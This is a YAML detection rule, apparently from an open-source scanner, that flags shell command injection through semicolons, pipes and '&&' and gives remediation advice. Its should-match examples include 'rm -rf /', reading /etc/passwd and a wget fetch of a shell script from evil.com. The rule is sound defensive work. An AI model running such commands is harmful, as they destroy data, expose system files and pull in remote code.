version: 1.0.0
rule_id: cmd-016
family: CMD
sub_family: shell_commands
name: Detects shell command injection with pipe and semicolon
description: Detects shell command injection with pipe and semicolon
severity: critical
confidence: 0.98
patterns:
- pattern: ;\s*(rm|del|cat|ls|wget|curl|nc|netcat|whoami|id|pwd)
  flags: []
  timeout: 5.0
- pattern: \|\s*(cat|grep|awk|sed|cut|sort)
  flags: []
  timeout: 5.0
- pattern: '&&\s*(whoami|id|uname|hostname|pwd)'
  flags: []
  timeout: 5.0
examples:
  should_match:
  - ; rm -rf /
  - '| cat /etc/passwd'
  - '&& whoami'
  - ; wget http://evil.com/shell.sh
  - '| grep password'
  should_not_match:
  - Linux pipe and semicolon usage
  - Shell command chaining tutorial
  - How to use pipes in bash
  - Command line operators guide
metrics:
  precision: null
  recall: null
  f1_score: null
  last_evaluated: null
mitre_attack:
- T1059
metadata:
  created: '2025-11-09'
  updated: '2025-11-09'
  author: raxe-ce
  legacy_rx_id: RX-CMD-0016
rule_hash: sha256:5f98908af1c3eb62a282b9b01d8bf221fa83e266087f96d5f1d6061ce39ed95d
risk_explanation: Shell command injection exploits enable arbitrary system command execution through vulnerable inputs. Attackers can read sensitive files, modify system configurations, escalate privileges, install backdoors, or completely compromise the underlying system.
remediation_advice: Never execute shell commands with user-controlled input. If command execution is necessary, use strict allowlisting of permitted commands and arguments. Implement input validation and sanitization. Use least-privilege execution contexts. Deploy command injection detection.
docs_url: https://github.com/raxe-ai/raxe-ce/wiki/CMD-016-Shell-Command-Injection
